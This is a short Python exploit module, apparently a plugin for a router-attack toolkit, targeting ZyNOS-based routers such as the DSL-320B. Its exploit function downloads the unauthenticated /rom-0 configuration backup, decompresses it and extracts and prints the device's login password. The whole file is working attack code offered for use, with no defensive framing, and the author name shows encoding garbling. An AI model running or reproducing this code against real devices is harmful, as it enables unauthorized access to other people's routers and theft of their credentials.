import imp
import urllib.request
name="""ZyNOS rom-0 backup"""
description="""Exploits that configuration settings can be retrieved without authentication
    Unpacks the settings file and returns the login password"""
author="""Tr√≥ndur Kruse"""

def exploit(ipadress):
    #Affects DSL-320B 
    url="http://"+ipadress+"/rom-0"
    req=urllib.request.Request(url)
    try:
        req=urllib.request.urlopen(url)
        decompressor=imp.load_source("decompressors.LZS", "decompressors/LZS.py")
        password=((decompressor.lzsUnpackFile(req.read())["autoexec.net"][24:]).decode().split(chr(0x00))[0])
        print("The password is: "+password)
        return(password)
    except urllib.error.HTTPError as req:
        return("Unable to get settings file")
        pass
    return("Unable to decode settings file")
